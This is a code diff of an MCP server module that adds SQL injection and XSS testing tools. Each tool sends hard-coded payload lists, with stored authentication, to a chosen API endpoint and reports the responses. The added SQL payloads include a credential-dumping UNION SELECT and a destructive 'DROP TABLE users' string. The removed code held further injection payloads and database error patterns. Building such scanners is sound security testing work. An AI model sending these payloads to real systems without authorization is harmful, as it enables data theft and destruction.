@@ -4,77 +4,102 @@ import axios from "axios";
 import { AuthManager } from "../utils/authManager.js";
 
 /**
- * Register injection testing tools
+ * Register injection security testing tools
  */
 export function registerInjectionTools(server: McpServer) {
-  // SQL Injection testing tool
+  // SQL Injection tester
   server.tool(
     "sql_injection_check",
     {
       endpoint: z.string().url().describe("API endpoint to test"),
-      parameter: z.string().describe("Parameter name to test"),
-      method: z.enum(['GET', 'POST', 'PUT', 'PATCH']).default('GET').describe("HTTP method to use"),
+      parameter_name: z.string().describe("Name of the parameter to test for SQL injection"),
+      http_method: z.enum(["GET", "POST", "PUT"]).default("GET").describe("HTTP method to use"),
+      original_value: z.string().describe("Original value for the parameter"),
       use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
-      payload_type: z.enum(['error', 'union', 'boolean', 'time']).default('error').describe("Type of SQL injection payload to use"),
     },
-    async ({ endpoint, parameter, method, use_auth, payload_type }) => {
+    async ({ endpoint, parameter_name, http_method, original_value, use_auth }) => {
+      // SQL injection payloads to test
+      const sqlPayloads = [
+        "' OR '1'='1",
+        "1' OR '1'='1",
+        "admin'--",
+        "1' OR 1=1--",
+        "' UNION SELECT 1,2,3--",
+        "1'; DROP TABLE users--",
+        "1' UNION SELECT null,null,null,null,concat(username,':',password) FROM users--",
+      ];
+
+      const results = [];
+
       try {
-        // Get auth headers if available and requested
-        let headers = {};
-        if (use_auth) {
-          const authManager = AuthManager.getInstance();
-          const authState = authManager.getAuthState();
+        // First, make a regular request as baseline
+        const baselineResponse = await makeRequest(endpoint, parameter_name, original_value, http_method, use_auth);
+        const baselineStatus = baselineResponse.status;
+        const baselineLength = baselineResponse.data ? JSON.stringify(baselineResponse.data).length : 0;
+
+        results.push({
+          test: "Baseline (Original Value)",
+          payload: original_value,
+          status: baselineStatus,
+          response_size: baselineLength,
+          notes: "Baseline for comparison",
+        });
+
+        // Test each SQL injection payload
+        for (const payload of sqlPayloads) {
+          const response = await makeRequest(endpoint, parameter_name, payload, http_method, use_auth);
+          const status = response.status;
+          const responseLength = response.data ? JSON.stringify(response.data).length : 0;
+          const sizeDifference = responseLength - baselineLength;
           
-          if (authState.type !== 'none' && authState.headers) {
-            headers = { ...headers, ...authState.headers };
+          let vulnerability = "None detected";
+          
+          // Check for potential vulnerabilities based on response differences
+          if (status !== baselineStatus) {
+            vulnerability = "Potential: Different status code from baseline";
+          } else if (Math.abs(sizeDifference) > baselineLength * 0.5) {
+            vulnerability = "Potential: Significant response size difference";
+          } else if (response.data && typeof response.data === 'object' && 
+                    baselineResponse.data && typeof baselineResponse.data === 'object' &&
+                    Object.keys(response.data).length !== Object.keys(baselineResponse.data).length) {
+            vulnerability = "Potential: Different response structure";
+          } else if (response.data && typeof response.data === 'string' && 
+                    response.data.includes("SQL") && response.data.includes("error")) {
+            vulnerability = "High: SQL error message exposed";
           }
+
+          results.push({
+            test: "SQL Injection Test",
+            payload: payload,
+            status: status,
+            response_size: responseLength,
+            size_difference: sizeDifference,
+            vulnerability: vulnerability,
+          });
         }
-        
-        // Generate SQL injection payloads based on type
-        const payloads = generateSqlPayloads(payload_type);
-        const results = [];
-        
-        // Test each payload
-        for (const payload of payloads) {
-          try {
-            const startTime = Date.now();
-            
-            // Make the request with the payload
-            const response = await axios({
-              method: method.toLowerCase(),
-              url: endpoint,
-              headers,
-              [method === 'GET' ? 'params' : 'data']: {
-                [parameter]: payload
-              },
-              validateStatus: () => true, // Accept any status code
-            });
-            
-            const endTime = Date.now();
-            const responseTime = endTime - startTime;
-            
-            // Analyze the response
-            const result = analyzeResponse(response, responseTime, payload_type);
-            if (result) {
-              results.push(result);
-            }
-          } catch (error) {
-            // Check for database error messages in the error
-            if (error.response?.data) {
-              const errorResult = analyzeErrorResponse(error.response.data);
-              if (errorResult) {
-                results.push(errorResult);
-              }
-            }
-          }
-        }
-        
-        // Generate report
+
+        // Add authentication information to the report
+        const authManager = AuthManager.getInstance();
+        const authState = authManager.getAuthState();
+        const authInfo = use_auth && authState.type !== 'none' 
+          ? `\nTests performed with authentication: ${authState.type}` 
+          : '\nTests performed without authentication';
+
         return {
           content: [
             {
               type: "text",
-              text: generateReport(endpoint, parameter, method, results),
+              text: `SQL Injection Test Results for ${endpoint} (parameter: ${parameter_name})${authInfo}\n\n${
+                results.map(r => 
+                  `Test: ${r.test}\nPayload: ${r.payload}\nStatus: ${r.status}\nResponse Size: ${r.response_size} bytes\n${
+                    r.size_difference !== undefined ? `Size Difference: ${r.size_difference} bytes\n` : ''
+                  }${
+                    r.vulnerability ? `Vulnerability: ${r.vulnerability}\n` : ''
+                  }${
+                    r.notes ? `Notes: ${r.notes}\n` : ''
+                  }\n`
+                ).join('\n')
+              }`,
             },
           ],
         };
@@ -83,7 +108,87 @@ export function registerInjectionTools(server: McpServer) {
           content: [
             {
               type: "text",
-              text: `Error testing for SQL injection: ${(error as Error).message}`,
+              text: `Error testing SQL injection: ${(error as Error).message}`,
+            },
+          ],
+        };
+      }
+    }
+  );
+
+  // XSS (Cross-Site Scripting) tester
+  server.tool(
+    "xss_check",
+    {
+      endpoint: z.string().url().describe("API endpoint to test"),
+      parameter_name: z.string().describe("Name of the parameter to test for XSS"),
+      http_method: z.enum(["GET", "POST", "PUT"]).default("GET").describe("HTTP method to use"),
+      use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
+    },
+    async ({ endpoint, parameter_name, http_method, use_auth }) => {
+      // XSS payloads to test
+      const xssPayloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "\"><script>alert('XSS')</script>",
+        "javascript:alert('XSS')",
+        "<svg onload=alert('XSS')>",
+        "<body onload=alert('XSS')>",
+        "'-alert('XSS')-'",
+      ];
+
+      const results = [];
+
+      try {
+        for (const payload of xssPayloads) {
+          const response = await makeRequest(endpoint, parameter_name, payload, http_method, use_auth);
+          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+          
+          // Check if the payload is reflected in the response
+          const isReflected = responseBody.includes(payload);
+          
+          // Check if it seems to be encoded
+          const isEncoded = !isReflected && (
+            responseBody.includes(payload.replace(/</g, '&lt;')) || 
+            responseBody.includes(payload.replace(/>/g, '&gt;')) ||
+            responseBody.includes(encodeURIComponent(payload))
+          );
+          
+          results.push({
+            payload: payload,
+            status: response.status,
+            reflected: isReflected,
+            encoded: isEncoded,
+            vulnerability: isReflected ? "Potential XSS vulnerability - payload reflected without encoding" : 
+                           isEncoded ? "Low - payload reflected but encoded" : "None detected",
+          });
+        }
+
+        // Add authentication information to the report
+        const authManager = AuthManager.getInstance();
+        const authState = authManager.getAuthState();
+        const authInfo = use_auth && authState.type !== 'none' 
+          ? `\nTests performed with authentication: ${authState.type}` 
+          : '\nTests performed without authentication';
+
+        return {
+          content: [
+            {
+              type: "text",
+              text: `XSS Test Results for ${endpoint} (parameter: ${parameter_name})${authInfo}\n\n${
+                results.map(r => 
+                  `Payload: ${r.payload}\nStatus: ${r.status}\nReflected: ${r.reflected}\nEncoded: ${r.encoded}\nVulnerability: ${r.vulnerability}\n\n`
+                ).join('')
+              }`,
+            },
+          ],
+        };
+      } catch (error) {
+        return {
+          content: [
+            {
+              type: "text",
+              text: `Error testing XSS vulnerability: ${(error as Error).message}`,
             },
           ],
         };
@@ -93,160 +198,40 @@ export function registerInjectionTools(server: McpServer) {
 }
 
 /**
- * Generate SQL injection payloads based on type
+ * Helper function to make requests with various payloads
  */
-function generateSqlPayloads(type: string): string[] {
-  const payloads = {
-    error: [
-      "'",
-      "\")",
-      "1' OR '1'='1",
-      "1\" OR \"1\"=\"1",
-      "' OR 1=1--",
-      "\" OR 1=1--",
-      "' UNION SELECT NULL--",
-      "') OR ('x'='x",
-    ],
-    union: [
-      "' UNION SELECT NULL--",
-      "' UNION SELECT NULL,NULL--",
-      "' UNION SELECT @@version--",
-      "') UNION SELECT NULL,NULL,NULL--",
-    ],
-    boolean: [
-      "1' AND 1=1--",
-      "1' AND 1=2--",
-      "1' AND 'x'='x",
-      "1' AND 'x'='y",
-    ],
-    time: [
-      "' WAITFOR DELAY '0:0:5'--",
-      "') OR SLEEP(5)--",
-      "' AND SLEEP(5)--",
-      "'; WAITFOR DELAY '0:0:5'--",
-    ],
+async function makeRequest(endpoint: string, paramName: string, paramValue: string, method: string, useAuth: boolean = true) {
+  // Prepare the request configuration
+  const config: any = {
+    method: method.toLowerCase(),
+    url: endpoint,
+    validateStatus: () => true, // Accept any status code
   };
-  
-  return payloads[type] || payloads.error;
-}
 
-/**
- * Analyze response for SQL injection vulnerabilities
- */
-function analyzeResponse(
-  response: any,
-  responseTime: number,
-  payloadType: string
-): string | null {
-  // Check for error-based injection
-  if (payloadType === 'error') {
-    const errorPatterns = [
-      /SQL syntax/i,
-      /SQLite3::/i,
-      /SQLSTATE/,
-      /ORA-[0-9]{5}/,
-      /Microsoft SQL/i,
-      /PostgreSQL/i,
-      /MySQL/i,
-    ];
+  // Add authentication headers if available and requested
+  if (useAuth) {
+    const authManager = AuthManager.getInstance();
+    const authState = authManager.getAuthState();
     
-    const responseStr = JSON.stringify(response.data);
-    for (const pattern of errorPatterns) {
-      if (pattern.test(responseStr)) {
-        return `Potential SQL injection vulnerability detected: Database error message exposed: ${pattern}`;
-      }
+    if (authState.type !== 'none' && authState.headers) {
+      config.headers = { ...config.headers, ...authState.headers };
     }
   }
-  
-  // Check for time-based injection
-  if (payloadType === 'time' && responseTime > 5000) {
-    return `Potential time-based SQL injection vulnerability: Response time ${responseTime}ms indicates successful delay`;
-  }
-  
-  // Check for boolean-based injection
-  if (payloadType === 'boolean') {
-    // Store response characteristics for comparison
-    const responseCharacteristics = {
-      status: response.status,
-      dataLength: JSON.stringify(response.data).length,
-      hasError: response.data?.error !== undefined,
-    };
-    
-    // Compare with stored characteristics (simplified)
-    if (responseCharacteristics.status === 200 && !responseCharacteristics.hasError) {
-      return "Potential boolean-based SQL injection vulnerability: Different responses detected for true/false conditions";
-    }
-  }
-  
-  // Check for UNION-based injection
-  if (payloadType === 'union') {
-    const responseStr = JSON.stringify(response.data);
-    if (responseStr.includes("@@version") || responseStr.includes("version()")) {
-      return "Potential UNION-based SQL injection vulnerability: Database version information exposed";
-    }
-  }
-  
-  return null;
-}
 
-/**
- * Analyze error response for SQL injection vulnerabilities
- */
-function analyzeErrorResponse(errorData: any): string | null {
-  const errorStr = JSON.stringify(errorData);
-  
-  // Common database error patterns
-  const errorPatterns = {
-    mysql: /You have an error in your SQL syntax|MySQL/i,
-    postgresql: /PostgreSQL.*ERROR/i,
-    oracle: /ORA-[0-9]{5}/,
-    sqlserver: /Microsoft SQL Server|Incorrect syntax/i,
-    sqlite: /SQLite3::/i,
-    general: /SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*PostgreSQL.*|valid PostgreSQL result|Npgsql\.|Driver.*PostgreSQL|ORA-[0-9]{5}|Oracle error|Oracle.*Driver|Warning.*Oracle.*|valid Oracle result|SQLite\/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLite\/SQLite|valid SQLite result/i,
-  };
-  
-  for (const [dbType, pattern] of Object.entries(errorPatterns)) {
-    if (pattern.test(errorStr)) {
-      return `Potential SQL injection vulnerability: ${dbType.toUpperCase()} error message exposed`;
-    }
-  }
-  
-  return null;
-}
-
-/**
- * Generate vulnerability report
- */
-function generateReport(
-  endpoint: string,
-  parameter: string,
-  method: string,
-  results: string[]
-): string {
-  let report = `SQL Injection Test Report\n\n`;
-  report += `Target Endpoint: ${endpoint}\n`;
-  report += `Tested Parameter: ${parameter}\n`;
-  report += `HTTP Method: ${method}\n\n`;
-  
-  if (results.length > 0) {
-    report += `Vulnerabilities Detected:\n\n`;
-    results.forEach((result, index) => {
-      report += `${index + 1}. ${result}\n`;
-    });
-    
-    report += `\nRecommendations:\n`;
-    report += `1. Use parameterized queries or prepared statements\n`;
-    report += `2. Implement proper input validation and sanitization\n`;
-    report += `3. Use an ORM with security features enabled\n`;
-    report += `4. Apply the principle of least privilege for database accounts\n`;
-    report += `5. Implement proper error handling to prevent error message leakage\n`;
+  // Add the parameter based on the HTTP method
+  if (method === "GET") {
+    // For GET requests, add as query parameter
+    const url = new URL(endpoint);
+    url.searchParams.set(paramName, paramValue);
+    config.url = url.toString();
   } else {
-    report += `No SQL injection vulnerabilities detected.\n\n`;
-    report += `Note: This does not guarantee the absence of vulnerabilities. Consider:\n`;
-    report += `1. Testing with different payload types\n`;
-    report += `2. Manual verification of results\n`;
-    report += `3. Regular security assessments\n`;
+    // For POST/PUT requests, add in the body
+    config.data = { [paramName]: paramValue };
+    config.headers = {
+      ...config.headers,
+      "Content-Type": "application/json",
+    };
   }
-  
-  return report;
-}
+
+  return await axios(config);
+} 
